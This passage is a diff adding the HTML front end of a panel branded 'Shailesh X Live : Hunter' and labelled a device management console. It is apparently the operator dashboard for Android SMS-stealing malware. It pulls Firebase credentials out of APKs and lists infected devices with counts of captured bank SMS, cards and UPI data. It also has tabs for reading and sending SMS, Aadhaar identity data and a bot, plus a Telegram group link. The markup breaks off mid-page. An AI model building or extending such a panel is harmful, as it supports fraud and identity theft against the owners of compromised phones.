@@ -1,0 +1,975 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+  <title>𝐒𝐡𝐚𝐢𝐥𝐞𝐬𝐡 𝐗 𝐋𝐢𝐯𝐞 : 𝐇𝐮𝐧𝐭𝐞𝐫 ☠️ — Device Management Console</title>
+  <meta name="description" content="𝐒𝐡𝐚𝐢𝐥𝐞𝐬𝐡 𝐗 𝐋𝐢𝐯𝐞 : 𝐇𝐮𝐧𝐭𝐞𝐫 ☠️ — Firebase device management dashboard for monitoring and managing connected Android devices." />
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='8' fill='%23dc2626'/%3E%3Cpath d='M16 6l8 4v8l-8 8-8-8V10z' fill='white' opacity='.9'/%3E%3C/svg%3E" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="style.css?v=20260826_v42" />
+</head>
+<body>
+
+<!-- ═══════════════════════════════════════════════════════════════════════════
+     LOGIN PAGE
+════════════════════════════════════════════════════════════════════════════ -->
+<div id="login-page">
+  <div class="login-grid-bg"></div>
+  <div class="login-glow1"></div>
+  <div class="login-glow2"></div>
+
+  <div class="login-container">
+
+    <!-- Logo -->
+    <div class="login-logo-wrap">
+      <div class="login-logo-icon">
+        <!-- Shield icon -->
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" style="width:2rem;height:2rem;color:white">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z"/>
+        </svg>
+      </div>
+      <div class="login-title-row">
+        <h1 class="login-title">𝐒𝐡𝐚𝐢𝐥𝐞𝐬𝐡 𝐗 𝐋𝐢𝐯𝐞 : 𝐇𝐮𝐧𝐭𝐞𝐫 ☠️</h1>
+        <p class="login-subtitle">Device Management Console</p>
+      </div>
+    </div>
+
+    <!-- Glass card -->
+    <div class="glass-card">
+
+      <!-- Saved accounts view -->
+      <div id="saved-accounts-section">
+        <div class="saved-header">
+          <div class="saved-header-left">
+            <!-- Database icon -->
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:1rem;height:1rem;color:#888">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M20.25 6.375c0 2.278-3.694 4.125-8.25 4.125S3.75 8.653 3.75 6.375m16.5 0c0-2.278-3.694-4.125-8.25-4.125S3.75 4.097 3.75 6.375m16.5 0v11.25c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125V6.375m16.5 2.25c0 2.278-3.694 4.125-8.25 4.125S3.75 10.903 3.75 8.625m0 2.25c0 2.278 3.694 4.125 8.25 4.125s8.25-1.847 8.25-4.125"/>
+            </svg>
+            <span>Saved Accounts</span>
+          </div>
+          <span class="saved-count" id="saved-count">0 accounts</span>
+        </div>
+
+        <div class="saved-list" id="saved-list">
+          <div class="saved-empty" id="saved-empty">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:2rem;height:2rem;margin:0 auto 0.5rem;opacity:0.3">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M20.25 6.375c0 2.278-3.694 4.125-8.25 4.125S3.75 8.653 3.75 6.375m16.5 0c0-2.278-3.694-4.125-8.25-4.125S3.75 4.097 3.75 6.375m16.5 0v11.25c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125V6.375m16.5 2.25c0 2.278-3.694 4.125-8.25 4.125S3.75 10.903 3.75 8.625m0 2.25c0 2.278 3.694 4.125 8.25 4.125s8.25-1.847 8.25-4.125"/>
+            </svg>
+            <p>No saved accounts</p>
+          </div>
+        </div>
+
+        <button class="btn-new-account" id="btn-show-new">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:1rem;height:1rem">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M12 4.5v15m7.5-7.5h-15"/>
+          </svg>
+          New Account
+        </button>
+      </div>
+
+      <!-- New account form -->
+      <div id="new-account-form">
+        <div class="form-back-row">
+          <button class="btn-back" id="btn-back-saved" title="Back">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M8.25 4.5l7.5 7.5-7.5 7.5"/>
+            </svg>
+          </button>
+          <h3 class="form-title">New Firebase Account</h3>
+        </div>
+
+        <!-- APK upload -->
+        <div class="apk-section">
+          <span class="apk-label-text">Extract from APK (optional)</span>
+
+          <label id="apk-dropzone" class="apk-dropzone" for="apk-file-input"
+            ondragover="event.preventDefault()"
+            ondrop="handleApkDrop(event)">
+            <div class="apk-dropzone-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 00-3.375-3.375h-1.5A1.125 1.125 0 0113.5 7.125v-1.5a3.375 3.375 0 00-3.375-3.375H8.25m6.75 12l-3-3m0 0l-3 3m3-3v6m-1.5-15H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 00-9-9z"/>
+              </svg>
+            </div>
+            <div class="apk-dropzone-text">
+              <p class="apk-dropzone-title">Upload APK File</p>
+              <p class="apk-dropzone-sub">Auto-extracts Firebase URL &amp; API Key</p>
+            </div>
+            <input id="apk-file-input" type="file" accept=".apk,.zip" class="sr-only"
+              onchange="handleApkFile(event)" onclick="event.stopPropagation()" />
+          </label>
+
+          <div class="apk-scanning" id="apk-scanning">
+            <div style="width:2rem;height:2rem;border:2px solid rgba(249,115,22,0.4);border-top-color:#f97316;border-radius:50%" class="spin"></div>
+            <div style="text-align:center">
+              <p style="font-size:0.8rem;font-weight:600;color:#fb923c">Scanning APK…</p>
+              <p style="font-size:0.65rem;color:#444;margin-top:0.25rem;font-family:monospace" id="apk-scan-status"></p>
+            </div>
+          </div>
+
+          <div class="apk-error" id="apk-error">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:1rem;height:1rem;color:#f87171;flex-shrink:0">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m9-.75a9 9 0 11-18 0 9 9 0 0118 0zm-9 3.75h.008v.008H12v-.008z"/>
+            </svg>
+            <p id="apk-error-msg"></p>
+            <button onclick="clearApkState()" style="background:transparent;border:none;cursor:pointer;color:#555">
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:0.875rem;height:0.875rem"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/></svg>
+            </button>
+          </div>
+
+          <div class="apk-success" id="apk-success">
+            <div class="apk-success-header">
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:0.875rem;height:0.875rem;color:#4ade80">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+              </svg>
+              <span>Extracted Successfully</span>
+              <button onclick="clearApkState()" style="margin-left:auto;background:transparent;border:none;cursor:pointer;color:#444">
+                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:0.875rem;height:0.875rem"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/></svg>
+              </button>
+            </div>
+            <div class="apk-success-body">
+              <div>
+                <p class="apk-field-label">Firebase URL</p>
+                <div class="apk-field-val">
+                  <span id="apk-url-display"></span>
+                </div>
+              </div>
+              <div>
+                <p class="apk-field-label">API Key</p>
+                <div class="apk-field-val">
+                  <span id="apk-key-display"></span>
+                </div>
+              </div>
+              <p style="font-size:0.65rem;color:rgba(34,197,94,0.5);margin-top:0.25rem">Fields auto-filled below ↓</p>
+            </div>
+          </div>
+        </div>
+
+        <!-- Fields -->
+        <div class="form-fields">
+          <div>
+            <label class="field-label" for="input-url">Firebase Database URL</label>
+            <input id="input-url" type="text" class="field-input" placeholder="https://your-project-default-rtdb.firebaseio.com" autocomplete="off" spellcheck="false" />
+          </div>
+          <div>
+            <label class="field-label" for="input-key">
+              Authentication Key / Secret
+              <span style="font-size:0.62rem;font-weight:500;color:#22c55e;margin-left:0.4rem;background:rgba(34,197,94,0.1);border:1px solid rgba(34,197,94,0.25);padding:0.1rem 0.4rem;border-radius:0.3rem">optional</span>
+            </label>
+            <input id="input-key" type="text" class="field-input" placeholder="Leave blank if database rules are public" autocomplete="off" spellcheck="false" />
+          </div>
+          <!-- Public DB tip -->
+          <div style="display:flex;align-items:flex-start;gap:0.5rem;padding:0.6rem 0.75rem;border-radius:0.6rem;background:rgba(34,197,94,0.06);border:1px solid rgba(34,197,94,0.2);margin-top:-0.25rem">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:0.9rem;height:0.9rem;color:#4ade80;flex-shrink:0;margin-top:0.1rem">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M11.25 11.25l.041-.02a.75.75 0 011.063.852l-.708 2.836a.75.75 0 001.063.853l.041-.021M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-9-3.75h.008v.008H12V8.25z"/>
+            </svg>
+            <p style="font-size:0.67rem;color:rgba(134,239,172,0.85);line-height:1.5">
+              <strong style="color:#4ade80">Public Database?</strong> If your Firebase rules are set to <code style="background:rgba(255,255,255,0.08);padding:0.05rem 0.3rem;border-radius:0.25rem;font-size:0.65rem">.read: true</code>, leave the API key blank — the panel connects directly with no auth needed.
+            </p>
+          </div>
+        </div>
+
+        <div class="form-actions">
+          <button class="btn-connect" id="btn-connect" onclick="handleConnect()">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:1rem;height:1rem">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M13.19 8.688a4.5 4.5 0 011.242 7.244l-4.5 4.5a4.5 4.5 0 01-6.364-6.364l1.757-1.757m13.35-.622l1.757-1.757a4.5 4.5 0 00-6.364-6.364l-4.5 4.5a4.5 4.5 0 001.242 7.244"/>
+            </svg>
+            <span id="btn-connect-text">Save &amp; Connect</span>
+          </button>
+          <button class="btn-cancel" id="btn-cancel-form">Cancel</button>
+        </div>
+
+        <p class="form-error" id="form-error"></p>
+      </div>
+
+    </div>
+    <p class="login-footer">𝐒𝐡𝐚𝐢𝐥𝐞𝐬𝐡 𝐗 𝐋𝐢𝐯𝐞 : 𝐇𝐮𝐧𝐭𝐞𝐫 ☠️ Admin Console · All connections are encrypted</p>
+  </div>
+
+  <!-- Share link modal -->
+  <div id="share-modal" style="display:none;position:fixed;inset:0;z-index:50;display:none;align-items:center;justify-content:center;padding:1rem;background:rgba(0,0,0,0.75);backdrop-filter:blur(6px)">
+    <div style="background:linear-gradient(145deg,#0d1117,#0a1220);border:1px solid #1a2a3a;border-radius:1.25rem;padding:1.5rem;max-width:24rem;width:100%;box-shadow:0 0 40px rgba(0,136,204,0.15),0 20px 60px rgba(0,0,0,0.6)">
+      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:1.25rem">
+        <div style="display:flex;align-items:center;gap:0.5rem">
+          <div style="width:2rem;height:2rem;border-radius:0.75rem;background:rgba(30,58,138,0.5);border:1px solid rgba(37,99,235,0.4);display:flex;align-items:center;justify-content:center">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:1rem;height:1rem;color:#60a5fa">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M7.217 10.907a2.25 2.25 0 100 2.186m0-2.186c.18.324.283.696.283 1.093s-.103.77-.283 1.093m0-2.186l9.566-5.314m-9.566 7.5l9.566 5.314m0 0a2.25 2.25 0 103.935 2.186 2.25 2.25 0 00-3.935-2.186zm0-12.814a2.25 2.25 0 103.933-2.185 2.25 2.25 0 00-3.933 2.185z"/>
+            </svg>
+          </div>
+          <div>
+            <p style="font-size:0.85rem;font-weight:600;color:white">Share Connection</p>
+            <p style="font-size:0.7rem;color:#4a6a8a">Anyone with this link can connect directly</p>
+          </div>
+        </div>
+        <button onclick="closeShareModal()" style="background:rgba(255,255,255,0.05);border:1px solid #1e2e3e;border-radius:0.5rem;padding:0.375rem;cursor:pointer;color:#556">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:0.875rem;height:0.875rem"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/></svg>
+        </button>
+      </div>
+      <div style="display:flex;align-items:center;gap:0.5rem;background:rgba(255,255,255,0.04);border:1px solid #1e2a3a;border-radius:0.75rem;padding:0.625rem 0.75rem;margin-bottom:1rem">
+        <span id="share-link-text" style="font-size:0.7rem;font-family:monospace;color:#888;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"></span>
+        <button id="btn-copy-share" onclick="copyShareLink()" style="flex-shrink:0;display:flex;align-items:center;gap:0.375rem;padding:0.375rem 0.75rem;border-radius:0.5rem;background:rgba(30,58,138,0.5);border:1px solid rgba(37,99,235,0.4);color:#60a5fa;font-size:0.7rem;font-weight:700;cursor:pointer;transition:all 0.2s">
+          Copy
+        </button>
+      </div>
+      <div style="display:flex;align-items:flex-start;gap:0.5rem;padding:0.75rem;border-radius:0.75rem;background:rgba(92,58,6,0.2);border:1px solid rgba(120,80,20,0.4)">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:1rem;height:1rem;color:#f59e0b;flex-shrink:0;margin-top:0.1rem">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z"/>
+        </svg>
+        <p style="font-size:0.7rem;color:rgba(251,191,36,0.8)">This link contains your Firebase credentials. Only share with trusted people.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════════════
+     DASHBOARD PAGE
+════════════════════════════════════════════════════════════════════════════ -->
+<div id="dashboard-page" style="display:none">
+
+  <!-- Header -->
+  <header class="dash-header">
+    <div class="dash-header-inner">
+      <!-- Brand -->
+      <div class="logo-brand">
+        <div class="logo-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" style="width:0.875rem;height:0.875rem;color:white">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z"/>
+          </svg>
+        </div>
+        <span class="logo-text">𝐒𝐡𝐚𝐢𝐥𝐞𝐬𝐡 𝐗 𝐋𝐢𝐯𝐞 : 𝐇𝐮𝐧𝐭𝐞𝐫 ☠️</span>
+        <span class="logo-dot"></span>
+      </div>
+
+      <!-- Search -->
+      <div class="search-wrap">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"/>
+        </svg>
+        <input id="search-input" type="text" class="search-input" placeholder="Search devices…" oninput="applyFilters()" />
+      </div>
+
+      <!-- Right -->
+      <div class="header-right">
+        <a href="https://t.me/+UWhrJmhFHCk3MTJl" target="_blank" rel="noopener noreferrer" class="btn-telegram-header" title="Join 𝐒𝐡𝐚𝐢𝐥𝐞𝐬𝐡 𝐗 𝐋𝐢𝐯𝐞 : 𝐇𝐮𝐧𝐭𝐞𝐫 ☠️">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="tg-header-icon">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.54 3.69-.52.36-1 .54-1.43.53-.47-.01-1.37-.26-2.04-.48-.82-.27-1.47-.42-1.42-.88.03-.24.37-.49 1.02-.75 3.99-1.74 6.66-2.89 8.01-3.45 3.81-1.59 4.6-1.87 5.12-1.88.11 0 .37.03.54.17.14.12.18.28.2.45-.02.07-.02.16-.04.25z"/>
+          </svg>
+          <span>Telegram</span>
+        </a>
+        <div class="connected-badge">
+          <span class="connected-dot"></span>
+          <span>Connected</span>
+        </div>
+
+        <div class="clock-badge">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M12 6v6h4.5m4.5 0a9 9 0 11-18 0 9 9 0 0118 0z"/>
+          </svg>
+          <span id="clock-display">00:00</span>
+        </div>
+
+        <button class="btn-logout" onclick="handleLogout()">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 9V5.25A2.25 2.25 0 0013.5 3h-6a2.25 2.25 0 00-2.25 2.25v13.5A2.25 2.25 0 007.5 21h6a2.25 2.25 0 002.25-2.25V15M12 9l-3 3m0 0l3 3m-3-3h12.75"/>
+          </svg>
+          Logout
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <!-- Error banner -->
+  <div class="error-banner" id="error-banner">
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+      <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m9-.75a9 9 0 11-18 0 9 9 0 0118 0zm-9 3.75h.008v.008H12v-.008z"/>
+    </svg>
+    <p id="error-banner-msg"></p>
+    <button onclick="dismissError()">
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/></svg>
+    </button>
+  </div>
+
+  <!-- Stats + Filters -->
+  <div class="stats-bar">
+    <div class="stats-bar-inner">
+      <div class="stats-group">
+        <div class="stat-item">
+          <p class="stat-label">Total</p>
+          <p class="stat-value" id="stat-total">0</p>
+        </div>
+        <div class="stat-item">
+          <p class="stat-label">Online</p>
+          <p class="stat-value green" id="stat-online">0</p>
+        </div>
+        <div class="stat-item">
+          <p class="stat-label">Offline</p>
+          <p class="stat-value dim" id="stat-offline">0</p>
+        </div>
+        <div class="stat-item">
+          <p class="stat-label">Bank SMS</p>
+          <p class="stat-value green" id="stat-bank">0</p>
+        </div>
+        <div class="stat-item">
+          <p class="stat-label">Cards</p>
+          <p class="stat-value purple" id="stat-cards">0</p>
+        </div>
+      </div>
+
+      <div class="filters-group">
+        <button class="btn-magic-scan" id="btn-magic-scan" onclick="magicScan()">
+          <span class="magic-scan-icon">✨</span>
+          <span class="magic-scan-txt">Magic Scan</span>
+        </button>
+        <button class="filter-btn filter-btn-priority" id="btn-filter-priority" data-filter="priority" onclick="setFilter('priority',this)">🔴 Priority</button>
+        <div class="divider-v"></div>
+        <button class="filter-btn active" data-filter="all" onclick="setFilter('all',this)">All</button>
+        <button class="filter-btn" data-filter="online" onclick="setFilter('online',this)">Online</button>
+        <button class="filter-btn" data-filter="offline" onclick="setFilter('offline',this)">Offline</button>
+        <button class="filter-btn" data-filter="upi" onclick="setFilter('upi',this)">Upi</button>
+        <button class="filter-btn" data-filter="bank" onclick="setFilter('bank',this)">Bank</button>
+        <button class="filter-btn" data-filter="card" onclick="setFilter('card',this)">Card</button>
+        <div class="divider-v"></div>
+        <select class="sort-select" id="sort-select" onchange="applyFilters()">
+          <option value="new">Newest</option>
+          <option value="old">Oldest</option>
+          <option value="name">Name</option>
+          <option value="battery">Battery</option>
+        </select>
+        <button class="btn-refresh" id="btn-refresh" onclick="triggerRefresh()">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0l3.181 3.183a8.25 8.25 0 0013.803-3.7M4.031 9.865a8.25 8.25 0 0113.803-3.7l3.181 3.182m0-4.991v4.99"/>
+          </svg>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Main content -->
+  <main class="dash-main">
+
+    <!-- Loading state -->
+    <div id="loading-state" class="loading-state visible">
+      <div class="loading-spinner-row">
+        <div class="spinner"></div>
+        <span class="loading-text">Connecting to Firebase…</span>
+      </div>
+      <div class="cards-grid" id="skeleton-grid"></div>
+    </div>
+
+    <!-- Empty state (no devices) -->
+    <div id="empty-state" class="empty-state">
+      <div class="empty-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z"/>
+        </svg>
+      </div>
+      <p class="empty-title">No devices connected</p>
+      <p class="empty-sub">Waiting for devices to register…</p>
+      <div class="auto-refresh-badge">
+        <span class="pulse-dot"></span>
+        <span>Auto-refreshing every 15s</span>
+      </div>
+    </div>
+
+    <!-- Cards container -->
+    <div id="cards-container" style="display:none">
+      <div class="sms-loading-banner" id="sms-loading-banner">
+        <div class="spinner green" style="width:0.75rem;height:0.75rem"></div>
+        <span>Loading SMS data…</span>
+      </div>
+      <div class="cards-grid" id="cards-grid">
+        <div class="filter-empty" id="filter-empty">
+          <p>No devices match your filter</p>
+        </div>
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════════════
+     DETAIL PANEL
+════════════════════════════════════════════════════════════════════════════ -->
+<div id="detail-overlay">
+  <div class="detail-backdrop" onclick="closeDetail()"></div>
+  <div class="detail-panel">
+
+    <!-- Header -->
+    <div class="detail-header">
+      <div class="detail-header-left">
+        <div class="detail-device-icon" id="detail-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M10.5 1.5H8.25A2.25 2.25 0 006 3.75v16.5a2.25 2.25 0 002.25 2.25h7.5A2.25 2.25 0 0018 20.25V3.75a2.25 2.25 0 00-2.25-2.25H13.5m-3 0V3h3V1.5m-3 0h3m-3 8.25h3m-3 3h3m-3 3h.008v.008H10.5V18z"/>
+          </svg>
+        </div>
+        <div>
+          <p class="detail-name" id="detail-name">—</p>
+          <p class="detail-id" id="detail-dev-id">—</p>
+        </div>
+      </div>
+      <div class="detail-header-right">
+        <button class="btn-detail-share" id="btn-detail-share" onclick="openDeviceShareModal()" title="Share Single Device Access" style="padding:0.4rem 0.6rem;background:rgba(56,189,248,0.12);border:1px solid rgba(56,189,248,0.3);color:#38bdf8;border-radius:0.5rem;font-size:0.75rem;font-weight:600;display:flex;align-items:center;gap:0.35rem;cursor:pointer;transition:all 0.2s;">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:0.9rem;height:0.9rem">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M7.217 10.907a2.25 2.25 0 100 2.186m0-2.186c.18.324.283.696.283 1.093s-.103.77-.283 1.093m0-2.186l9.566-5.314m-9.566 7.5l9.566 5.314m0 0a2.25 2.25 0 103.935 2.186 2.25 2.25 0 00-3.935-2.186zm0-12.814a2.25 2.25 0 103.933-2.185 2.25 2.25 0 00-3.933 2.185z"/>
+          </svg>
+          <span>Share</span>
+        </button>
+        <button class="btn-detail-del" id="btn-detail-del" onclick="deleteDevice()">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M14.74 9l-.346 9m-4.788 0L9.26 9m9.968-3.21c.342.052.682.107 1.022.166m-1.022-.165L18.16 19.673a2.25 2.25 0 01-2.244 2.077H8.084a2.25 2.25 0 01-2.244-2.077L4.772 5.79m14.456 0a48.108 48.108 0 00-3.478-.397m-12 .562c.34-.059.68-.114 1.022-.165m0 0a48.11 48.11 0 013.478-.397m7.5 0v-.916c0-1.18-.91-2.164-2.09-2.201a51.964 51.964 0 00-3.32 0c-1.18.037-2.09 1.022-2.09 2.201v.916m7.5 0a48.667 48.667 0 00-7.5 0"/>
+          </svg>
+        </button>
+        <button class="btn-detail-close" onclick="closeDetail()">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/>
+          </svg>
+        </button>
+      </div>
+    </div>
+
+    <!-- Status bar -->
+    <div class="detail-status-bar" id="detail-status-bar">
+      <div class="detail-status-item">
+        <span class="status-dot" id="detail-status-dot"></span>
+        <span id="detail-status-text" style="font-size:0.75rem;font-weight:600"></span>
+        <span id="detail-offline-since" style="font-size:0.65rem;font-family:monospace;color:rgba(248,113,113,0.7)"></span>
+      </div>
+      <div class="detail-status-item">
+        <span class="detail-bat">Bat</span>
+        <span class="detail-bat-val" id="detail-bat-val"></span>
+      </div>
+      <span class="detail-upi-badge" id="detail-upi-badge" style="display:none"></span>
+      <span class="detail-bank-badge" id="detail-bank-badge" style="display:none"></span>
+      <span class="detail-card-badge" id="detail-card-badge" style="display:none"></span>
+      <button onclick="openDeviceShareModal()" style="margin-left:auto;padding:0.25rem 0.6rem;background:rgba(56,189,248,0.2);border:1px solid rgba(56,189,248,0.4);color:#38bdf8;border-radius:0.4rem;font-size:0.7rem;font-weight:700;cursor:pointer;display:flex;align-items:center;gap:0.3rem">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:0.8rem;height:0.8rem">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M7.217 10.907a2.25 2.25 0 100 2.186m0-2.186c.18.324.283.696.283 1.093s-.103.77-.283 1.093m0-2.186l9.566-5.314m-9.566 7.5l9.566 5.314m0 0a2.25 2.25 0 103.935 2.186 2.25 2.25 0 00-3.935-2.186zm0-12.814a2.25 2.25 0 103.933-2.185 2.25 2.25 0 00-3.933 2.185z"/>
+        </svg>
+        <span>Share Device</span>
+      </button>
+    </div>
+
+    <!-- Tabs -->
+    <div class="detail-tabs" id="detail-tabs">
+      <button class="tab-btn active" data-tab="info" onclick="switchTab('info',this)">Info</button>
+      <button class="tab-btn" data-tab="bank" id="tab-bank-btn" onclick="switchTab('bank',this)">Bank (0)</button>
+      <button class="tab-btn" data-tab="cards" id="tab-cards-btn" onclick="switchTab('cards',this)">Card (0)</button>
+      <button class="tab-btn" data-tab="sms" id="tab-sms-btn" onclick="switchTab('sms',this)">SMS (0)</button>
+      <button class="tab-btn" data-tab="send" onclick="switchTab('send',this)">Send</button>
+      <button class="tab-btn" data-tab="aadhaar" id="tab-aadhaar-btn" onclick="switchTab('aadhaar',this)">🆔 Aadhaar</button>
+      <button class="tab-btn" data-tab="bot" id="tab-bot-btn" onclick="switchTab('bot',this)">🤖 Bot</button>
+    </div>
+
+    <!-- Tab body -->
+    <div class="detail-body">
+
+      <!-- INFO TAB -->
+      <div class="tab-pane active" id="tab-info">
+        <div class="info-section">
+          <div id="detail-offline-box" class="info-offline-box" style="display:none">
+            <p class="info-offline-label">Last Seen (Offline Since)</p>
+            <p class="info-offline-time" id="detail-offline-time"></p>
+            <p class="info-offline-ts" id="detail-offline-ts"></p>
+          </div>
+          <div id="detail-online-box" class="info-online-box" style="display:none">
